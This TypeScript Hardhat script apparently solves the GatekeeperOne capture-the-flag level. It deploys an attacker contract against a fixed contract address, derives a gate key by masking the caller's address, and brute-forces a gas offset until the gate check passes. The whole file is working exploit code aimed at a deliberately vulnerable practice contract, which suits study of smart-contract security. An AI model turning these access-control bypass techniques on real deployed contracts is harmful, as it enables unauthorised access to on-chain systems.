import { BigNumber } from 'ethers';
import { ethers } from 'hardhat';

const CONTRACT_ADDRESS = '0xC3f85264A12dE94F8EA282d649a49d51d38D77b2';
const CONTRACT_NAME = 'GatekeeperOne';
const ATTACKER_NAME = 'GatekeeperOneAttacker';

async function main() {
  const [attacker] = await ethers.getSigners();
  console.log('MY ADD: ', attacker.address);

  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  const attackerContractFactory = await ethers.getContractFactory(
    ATTACKER_NAME
  );
  const attackerContract = await attackerContractFactory.deploy(
    contract.address
  );
  await attackerContract.deployed();
  console.log('attackerContract ADD:', attackerContract.address);

  const mask = '0xffffffff0000ffff';
  const shortAddress =
    '0x' +
    attacker.address.slice(
      attacker.address.length - 16,
      attacker.address.length
    );
  const gateKey = BigNumber.from(shortAddress).and(mask);

  console.log('gateKey: ', gateKey);

  //   const gasOffset = 426; // Magic number taken from the debugger
  for (let i = 1; i < 8191; i++) {
    try {
      console.log(`Trying ${i}...`);
      const tx = await attackerContract.enter(i, BigNumber.from(gateKey), {
        gasLimit: 300000,
      });
      await tx.wait();
      console.log(`Found value: ${i}`);
      break;
    } catch (err) {}
  }
  let newEntrant = await contract.entrant();
  console.log('newEntrant: ', newEntrant);
}

main().catch((error) => {
  console.error(error);
  process.exit(1);
});
